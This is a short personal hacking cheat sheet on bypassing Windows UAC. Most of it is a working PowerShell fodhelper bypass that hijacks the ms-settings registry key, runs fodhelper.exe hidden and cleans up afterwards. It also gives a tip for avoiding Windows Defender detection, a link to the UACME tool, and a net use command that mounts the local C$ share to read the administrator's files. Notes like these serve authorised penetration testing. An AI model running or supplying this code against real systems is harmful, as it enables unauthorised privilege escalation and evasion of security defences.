# bypass UAC with administrators group
need session in interactive process.

## fodhelper bypass
~/kb/hacking/windows/uacbypass/fodhelper.ps1
pass in argument to `-program` or it gets detected by windows defender trying to spawn powershell. use cmd within interactive gui session.

https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
```powershell
function FodhelperBypass(){ 
 
Param (    
 
 [String]$program = "cmd /c start powershell.exe" #default
 
      )
 
#Create registry structure
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
}

# run it
FodhelperBypass -program cmd
FodhelperBypass
```

## uacme bypass
https://github.com/hfiref0x/UACME
compilation required - many build steps

## read files quickly using smb shares
mount local fileshare to read administrator's files.
authentication is different for localhost.
```powershell
net use Z: \\127.0.0.1\c$
```
